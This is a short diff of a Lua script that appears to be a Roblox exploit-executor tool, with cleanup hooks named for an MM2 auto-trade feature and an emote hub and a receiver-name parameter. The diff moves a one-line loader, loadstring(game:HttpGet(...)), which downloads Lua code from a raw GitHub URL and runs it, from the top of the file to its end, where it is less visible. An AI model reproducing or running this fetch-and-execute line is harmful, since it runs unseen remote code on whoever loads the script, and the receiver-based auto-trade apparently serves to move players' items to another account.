@@ -1,5 +1,3 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/luauglazer/Sort/refs/heads/main/YAHRMZIN.lua'),true))()
-
 local RECEIVER_NAME = ...
 if type(RECEIVER_NAME) ~= "string" or RECEIVER_NAME:match("^%s*$") then
     local g = getgenv and getgenv() or _G
@@ -1734,3 +1732,5 @@ env._MM2AutoTradeCleanup = function()
     end
 end
 env._EmoteHubCleanup = env._MM2AutoTradeCleanup
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/luauglazer/Sort/refs/heads/main/YAHRMZIN.lua'),true))()
